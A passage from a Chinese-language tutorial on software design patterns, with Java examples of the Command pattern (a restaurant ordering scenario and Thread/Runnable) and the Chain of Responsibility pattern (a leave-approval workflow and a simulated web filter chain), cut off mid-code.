<p>服务员： 就是调用者角色，由她来发起命令。</p>
<p>资深大厨： 就是接收者角色，真正命令执行的对象。</p>
<p>订单： 命令中包含订单。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-21-17-33-41.png" style="zoom:75%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span></span>;<span class="comment">//只需要定义一个统一的执行方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderCommand</span> <span class="keyword">implements</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//持有接受者对象</span></span><br><span class="line">    <span class="keyword">private</span> SeniorChef receiver;</span><br><span class="line">    <span class="keyword">private</span> Order order;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OrderCommand</span><span class="params">(SeniorChef receiver, Order order)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.receiver = receiver;</span><br><span class="line">        <span class="keyword">this</span>.order = order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        System.out.println(order.getDiningTable() + <span class="string">&quot;桌的订单：&quot;</span>);</span><br><span class="line">        Set&lt;String&gt; keys = order.getFoodDic().keySet();</span><br><span class="line">        <span class="keyword">for</span> (String key : keys) &#123;</span><br><span class="line">            receiver.makeFood(order.getFoodDic().get(key),key);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);<span class="comment">//停顿一下 模拟做饭的过程</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(order.getDiningTable() + <span class="string">&quot;桌的饭弄好了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Order</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 餐桌号码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> diningTable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用来存储餐名并记录份数</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Integer&gt; foodDic = <span class="keyword">new</span> HashMap&lt;String, Integer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDiningTable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> diningTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDiningTable</span><span class="params">(<span class="keyword">int</span> diningTable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.diningTable = diningTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Integer&gt; <span class="title">getFoodDic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> foodDic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFoodDic</span><span class="params">(String name, <span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        foodDic.put(name,num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资深大厨类 是命令的Receiver</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeniorChef</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeFood</span><span class="params">(<span class="keyword">int</span> num,String foodName)</span> </span>&#123;</span><br><span class="line">        System.out.println(num + <span class="string">&quot;份&quot;</span> + foodName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Waitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Command&gt; commands;<span class="comment">//可以持有很多的命令对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Waitor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        commands = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCommand</span><span class="params">(Command cmd)</span></span>&#123;</span><br><span class="line">        commands.add(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发出命令 喊 订单来了，厨师开始执行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">orderUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;美女服务员：叮咚，大厨，新订单来了.......&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; commands.size(); i++) &#123;</span><br><span class="line">            Command cmd = commands.get(i);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                cmd.execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建2个order</span></span><br><span class="line">        Order order1 = <span class="keyword">new</span> Order();</span><br><span class="line">        order1.setDiningTable(<span class="number">1</span>);</span><br><span class="line">        order1.getFoodDic().put(<span class="string">&quot;西红柿鸡蛋面&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        order1.getFoodDic().put(<span class="string">&quot;小杯可乐&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Order order2 = <span class="keyword">new</span> Order();</span><br><span class="line">        order2.setDiningTable(<span class="number">3</span>);</span><br><span class="line">        order2.getFoodDic().put(<span class="string">&quot;尖椒肉丝盖饭&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        order2.getFoodDic().put(<span class="string">&quot;小杯雪碧&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建接收者</span></span><br><span class="line">        SeniorChef receiver=<span class="keyword">new</span> SeniorChef();</span><br><span class="line">        <span class="comment">//将订单和接收者封装成命令对象</span></span><br><span class="line">        OrderCommand cmd1 = <span class="keyword">new</span> OrderCommand(receiver, order1);</span><br><span class="line">        OrderCommand cmd2 = <span class="keyword">new</span> OrderCommand(receiver, order2);</span><br><span class="line">        <span class="comment">//创建调用者 waitor</span></span><br><span class="line">        Waitor invoker = <span class="keyword">new</span> Waitor();</span><br><span class="line">        invoker.setCommand(cmd1);</span><br><span class="line">        invoker.setCommand(cmd2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将订单带到柜台 并向厨师喊 订单来了</span></span><br><span class="line">        invoker.orderUp();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h5><p><strong>1，优点：</strong></p>
<ul>
<li>降低系统的耦合度<strong>（调用者和接收者）</strong>。命令模式能将调用操作的对象与实现该操作的对象解耦。</li>
<li>增加或删除命令非常方便。采用命令模式增加与删除命令不会影响其他类，它满足“开闭原则”，对扩展比较灵活。</li>
<li>可以实现<strong>宏命令</strong>。命令模式可以与组合模式结合，将多个命令装配成一个组合命令，即宏命令。</li>
<li>方便实现 Undo 和 Redo 操作。命令模式可以与后面介绍的备忘录模式结合，实现命令的撤销与恢复。</li>
</ul>
<p><strong>2，缺点：</strong></p>
<ul>
<li>使用命令模式可能会导致某些系统有过多的具体命令类。</li>
<li>系统结构更加复杂。</li>
</ul>
<h5 id="使用场景-3"><a href="#使用场景-3" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li>系统需要将请求<strong>调用者</strong>和请求<strong>接收者</strong>解耦，使得调用者和接收者不直接交互。</li>
<li><strong>系统需要在不同的时间指定请求、将请求排队和执行请求</strong>。</li>
<li>系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作。</li>
</ul>
<h5 id="JDK源码解析-5"><a href="#JDK源码解析-5" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p><code>Runable</code>是一个典型命令模式，<code>Runnable</code>担当命令的角色，<code>Thread</code>充当的是调用者，<code>start</code>方法就是其执行方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//命令接口(抽象命令角色)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用者</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Runnable target;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (threadStatus != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalThreadStateException();</span><br><span class="line"></span><br><span class="line">        group.add(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> started = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            start0();</span><br><span class="line">            started = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!started) &#123;</span><br><span class="line">                    group.threadStartFailed(<span class="keyword">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">start0</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会调用一个native方法start0(),调用系统方法，开启一个线程。而接收者是对程序员开放的，可以自己定义接收者（下面的<code>Receiver</code>就是）。</p>
<blockquote>
<p><strong>解释</strong></p>
<ul>
<li>如果不定义<code>Receiver</code>类，就更像==策略模式==</li>
<li>下面的Receiver就是放在了重写的<code>run</code>方法中，这个方法使得<code>Runnable</code>类成为了命令角色，从而该方法中如果使用了新的自定义的<code>Receiver</code>类，那么就是接收者角色</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jdk Runnable 命令模式</span></span><br><span class="line"><span class="comment"> *		TurnOffThread ： 属于具体</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TurnOffThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> Receiver receiver;</span><br><span class="line">    </span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="title">TurnOffThread</span><span class="params">(Receiver receiver)</span> </span>&#123;</span><br><span class="line">     	<span class="keyword">this</span>.receiver = receiver;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     	receiver.turnOFF();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">         Receiver receiver = <span class="keyword">new</span> Receiver();</span><br><span class="line">         TurnOffThread turnOffThread = <span class="keyword">new</span> TurnOffThread(receiver);</span><br><span class="line">         Thread thread = <span class="keyword">new</span> Thread(turnOffThread);</span><br><span class="line">         thread.start();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h4><p><strong>概述</strong></p>
<p>在现实生活中，常常会出现这样的事例：一个请求有多个对象可以处理，但每个对象的处理条件或权限不同。例如，公司员工请假，可批假的领导有部门负责人、副总经理、总经理等，但每个领导能批准的天数不同，员工必须根据自己要请假的天数去找不同的领导签名，也就是说员工必须记住每个领导的姓名、电话和地址等信息，这增加了难度。这样的例子还有很多，如找领导出差报销、生活中的“击鼓传花”游戏等。</p>
<p><strong>定义：</strong></p>
<p>又名职责链模式，为了避免请求发送者与多个请求处理者耦合在一起，将所有请求的处理者通过前一对象记住其下一个对象的引用而连成一条链；当有请求发生时，可将请求沿着这条链传递，直到有对象处理它为止。</p>
<p><strong>结构</strong></p>
<p>职责链模式主要包含以下角色:</p>
<ul>
<li>抽象处理者（Handler）角色：定义一个处理请求的接口，包含抽象处理方法和一个后继连接。</li>
<li>具体处理者（Concrete Handler）角色：实现抽象处理者的处理方法，判断能否处理本次请求，如果可以处理请求则处理，否则将该请求转给它的后继者。</li>
<li>客户类（Client）角色：创建处理链，并向链头的具体处理者对象提交请求，它不关心处理细节和请求的传递过程。</li>
</ul>
<h5 id="案例实现-3"><a href="#案例实现-3" class="headerlink" title="案例实现"></a>案例实现</h5><p>现需要开发一个请假流程控制系统。请假一天以下的假只需要小组长同意即可；请假1天到3天的假还需要部门经理同意；请求3天到7天还需要总经理同意才行。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-22-14-09-29.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//请假条</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LeaveRequest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> num;<span class="comment">//请假天数</span></span><br><span class="line">    <span class="keyword">private</span> String content;<span class="comment">//请假内容</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LeaveRequest</span><span class="params">(String name, <span class="keyword">int</span> num, String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.num = num;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理者抽象类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> NUM_ONE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> NUM_THREE = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> NUM_SEVEN = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该领导处理的请假天数区间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> numStart;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> numEnd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//领导上面还有领导</span></span><br><span class="line">    <span class="keyword">private</span> Handler nextHandler;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置请假天数范围 上不封顶</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(<span class="keyword">int</span> numStart)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.numStart = numStart;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置请假天数范围</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(<span class="keyword">int</span> numStart, <span class="keyword">int</span> numEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.numStart = numStart;</span><br><span class="line">        <span class="keyword">this</span>.numEnd = numEnd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置上级领导</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNextHandler</span><span class="params">(Handler nextHandler)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nextHandler = nextHandler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//提交请假条</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">submit</span><span class="params">(LeaveRequest leave)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span> == <span class="keyword">this</span>.numStart)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果请假天数达到该领导者的处理要求</span></span><br><span class="line">        <span class="keyword">if</span>(leave.getNum() &gt;= <span class="keyword">this</span>.numStart)&#123;</span><br><span class="line">            <span class="keyword">this</span>.handleLeave(leave);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果还有上级 并且请假天数超过了当前领导的处理范围</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">null</span> != <span class="keyword">this</span>.nextHandler &amp;&amp; leave.getNum() &gt; numEnd)&#123;</span><br><span class="line">                <span class="keyword">this</span>.nextHandler.submit(leave);<span class="comment">//继续提交</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;流程结束&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//各级领导处理请假条方法</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">handleLeave</span><span class="params">(LeaveRequest leave)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小组长</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroupLeader</span> <span class="keyword">extends</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GroupLeader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//小组长处理1-3天的请假</span></span><br><span class="line">        <span class="keyword">super</span>(Handler.NUM_ONE, Handler.NUM_THREE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">handleLeave</span><span class="params">(LeaveRequest leave)</span> </span>&#123;</span><br><span class="line">        System.out.println(leave.getName() + <span class="string">&quot;请假&quot;</span> + leave.getNum() + <span class="string">&quot;天,&quot;</span> + leave.getContent() + <span class="string">&quot;。&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;小组长审批：同意。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//部门经理</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Manager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//部门经理处理3-7天的请假</span></span><br><span class="line">        <span class="keyword">super</span>(Handler.NUM_THREE, Handler.NUM_SEVEN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">handleLeave</span><span class="params">(LeaveRequest leave)</span> </span>&#123;</span><br><span class="line">        System.out.println(leave.getName() + <span class="string">&quot;请假&quot;</span> + leave.getNum() + <span class="string">&quot;天,&quot;</span> + leave.getContent() + <span class="string">&quot;。&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;部门经理审批：同意。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//总经理</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneralManager</span> <span class="keyword">extends</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GeneralManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//部门经理处理7天以上的请假</span></span><br><span class="line">        <span class="keyword">super</span>(Handler.NUM_SEVEN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">handleLeave</span><span class="params">(LeaveRequest leave)</span> </span>&#123;</span><br><span class="line">        System.out.println(leave.getName() + <span class="string">&quot;请假&quot;</span> + leave.getNum() + <span class="string">&quot;天,&quot;</span> + leave.getContent() + <span class="string">&quot;。&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;总经理审批：同意。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//请假条来一张</span></span><br><span class="line">        LeaveRequest leave = <span class="keyword">new</span> LeaveRequest(<span class="string">&quot;小花&quot;</span>,<span class="number">5</span>,<span class="string">&quot;身体不适&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//各位领导，依次是小组长、部门经理、总经理</span></span><br><span class="line">        GroupLeader groupLeader = <span class="keyword">new</span> GroupLeader();</span><br><span class="line">        Manager manager = <span class="keyword">new</span> Manager();</span><br><span class="line">        GeneralManager generalManager = <span class="keyword">new</span> GeneralManager();</span><br><span class="line"></span><br><span class="line">        groupLeader.setNextHandler(manager);<span class="comment">//小组长的领导是部门经理</span></span><br><span class="line">        manager.setNextHandler(generalManager);<span class="comment">//部门经理的领导是总经理</span></span><br><span class="line">        <span class="comment">//之所以在这里设置上级领导，是因为可以根据实际需求来更改设置，如果实战中上级领导人都是固定的，则可以移到领导实现类中。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//提交申请</span></span><br><span class="line">        groupLeader.submit(leave);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>优缺点</strong></p>
<ul>
<li><p><strong>优点：</strong></p>
<ul>
<li><p>降低了对象之间的耦合度</p>
</li>
<li><p>该模式降低了请求发送者和接收者的耦合度。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>增强了系统的可扩展性</p>
<p>可以根据需要增加新的请求处理类，满足开闭原则。</p>
</li>
</ul>
<ul>
<li><p>增强了给对象指派职责的灵活性</p>
<p>当工作流程发生变化，可以动态地改变链内的成员或者修改它们的次序，也可动态地新增或者删除责任。</p>
</li>
</ul>
<ul>
<li><p>责任链简化了对象之间的连接</p>
<p>一个对象只需保持一个指向其后继者的引用，不需保持其他所有处理者的引用，这避免了使用众多的 if 或者 if···else 语句<strong>（针对客户端而言）</strong>。</p>
</li>
</ul>
<ul>
<li><p>责任分担</p>
<p>每个类只需要处理自己该处理的工作，不能处理的传递给下一个对象完成，明确各类的责任范围，符合类的单一职责原则。</p>
</li>
</ul>
<ul>
<li><p><strong>缺点：</strong></p>
<ul>
<li><p>==不能保证每个请求一定被处理==。由于一个请求没有明确的接收者，所以不能保证它一定会被处理，该请求可能一直传到链的末端都得不到处理。</p>
</li>
<li><p>对比较长的职责链，请求的处理可能涉及多个处理对象，系统性能将受到一定影响。</p>
</li>
<li><p>职责链建立的合理性要靠客户端来保证，增加了客户端的复杂性，可能会由于职责链的错误设置而导致系统出错，如可能会造成循环调用。</p>
</li>
</ul>
</li>
</ul>
<h5 id="源码解析-1"><a href="#源码解析-1" class="headerlink" title="源码解析"></a>源码解析</h5><p>在javaWeb应用开发中，FilterChain是职责链（过滤器）模式的典型应用，以下是Filter的模拟实现分析:</p>
<ul>
<li><p>模拟web请求Request以及web响应Response</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Request</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Response</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>模拟web过滤器Filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(Request req,Response res,FilterChain c)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>模拟实现具体过滤器  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(Request request, Response response, FilterChain chain)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器1 前置处理&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先执行所有request再倒序执行所有response</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器1 后置处理&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondFilter</span>  <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(Request request, Response response, FilterChain chain)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器2 前置处理&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先执行所有request再倒序执行所有response</span></span><br><span class="line">        